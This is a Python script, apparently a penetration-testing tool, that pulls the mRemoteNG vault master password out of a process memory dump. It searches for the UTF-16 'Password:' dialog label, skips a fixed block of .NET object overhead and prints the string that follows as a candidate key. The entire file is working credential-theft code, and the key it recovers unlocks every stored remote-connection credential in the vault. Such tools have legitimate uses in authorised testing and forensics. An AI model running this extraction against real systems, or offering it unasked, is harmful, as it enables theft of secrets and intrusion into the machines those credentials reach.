"""!
@brief Extract mRemoteNG vault master key candidates from a process memory dump.

Scans a full memory dump of the mRemoteNG process for the UTF-16 LE "Password:"
signature left on the .NET managed heap by the WinForms password dialog
(FrmPassword.Designer.cs). The master key string is allocated immediately after
this signature on the heap, separated by 15 bytes of .NET x86 object overhead
(null terminator + sync block + method table pointer + string length).

Each printable UTF-16 LE string found at the expected offset is reported as a
candidate. The actual vault password will be among them.
"""

import sys


## UTF-16 LE byte sequence for "Password:" (17 bytes).
## Matches the WinForms designer literal from FrmPassword.Designer.cs:
## this.lblPassword.Text = "Password:";
## The last byte (0x3A) is the first byte of the colon character,
## with its trailing 0x00 falling into the 15-byte gap that follows.
KNOWN_SIGNATURE = b'\x50\x00\x61\x00\x73\x00\x73\x00\x77\x00\x6F\x00\x72\x00\x64\x00\x3A'

## Number of bytes between the end of the signature and the start of the
## master key string data. Corresponds to the .NET x86 string object overhead:
## 1 byte (colon trail) + 2 bytes (null terminator) + 4 bytes (sync block) +
## 4 bytes (method table pointer) + 4 bytes (string length field).
OFFSET_AFTER_SIGNATURE = 15

## UTF-16 LE null terminator used to find the end of candidate strings.
UTF16_LE_NULL_TERMINATOR = b'\x00\x00'


def find_passwords_in_dump(file_path):
    """! Scan a memory dump file for master key candidates.

    Reads the entire dump into memory, searches for all occurrences of the
    "Password:" UTF-16 LE signature, skips the 15-byte .NET object overhead
    after each hit, and decodes the following bytes as a UTF-16 LE string
    up to the next aligned null terminator.

    Candidates are filtered: the first byte must be non-zero (to skip
    empty/uninitialized slots) and the decoded string must be printable.

    @param file_path  str: Path to the memory dump file.
    """
    try:
        with open(file_path, 'rb') as f:
            memory_dump = f.read()
    except FileNotFoundError:
        print(f"[!] Error: File not found at {file_path}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An error occurred while reading the file: {e}")
        sys.exit(1)

    signature_len = len(KNOWN_SIGNATURE)

    found_count = 0
    output_count = 0
    current_pos = 0

    while True:
        index = memory_dump.find(KNOWN_SIGNATURE, current_pos)
        if index == -1:
            break

        found_count += 1
        password_start_offset = index + signature_len + OFFSET_AFTER_SIGNATURE

        extracted_bytes = b''
        source_info = ""

        if password_start_offset >= len(memory_dump):
            current_pos = index + signature_len
            continue

        search_for_null_from = password_start_offset
        aligned_null_terminator_index = -1

        while search_for_null_from < len(memory_dump) - 1:
            temp_null_idx = memory_dump.find(UTF16_LE_NULL_TERMINATOR, search_for_null_from)
            if temp_null_idx == -1:
                break
            if (temp_null_idx - password_start_offset) % 2 == 0:
                aligned_null_terminator_index = temp_null_idx
                break
            else:
                search_for_null_from = temp_null_idx + 1

        if aligned_null_terminator_index != -1:
            extracted_bytes = memory_dump[password_start_offset:aligned_null_terminator_index]
            source_info = f"(offset {hex(password_start_offset)} to {hex(aligned_null_terminator_index)})"
        else:
            segment_to_eof = memory_dump[password_start_offset:]
            if len(segment_to_eof) > 0 and len(segment_to_eof) % 2 == 0:
                extracted_bytes = segment_to_eof
                source_info = f"(offset {hex(password_start_offset)} to EOF, len {len(extracted_bytes)})"

        if extracted_bytes:
            if extracted_bytes[0] == 0x00:
                pass
            else:
                try:
                    decoded_string = extracted_bytes.decode('utf-16-le', errors='strict')
                    if decoded_string.isprintable():
                        print(f"[~] Password: '{decoded_string}' {source_info}")
                        output_count += 1
                    else:
                        pass
                except UnicodeDecodeError:
                    pass

        current_pos = index + signature_len

    if found_count == 0:
        print(f"[~] The specified signature was not found in the file.")
    elif output_count == 0:
        print(f"[~] Signature found {found_count} time(s), but no valid password strings matching all criteria were extracted.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"[!] Usage: python {sys.argv[0]} <file_path>")
        sys.exit(1)

    file_to_check = sys.argv[1]
    find_passwords_in_dump(file_to_check)
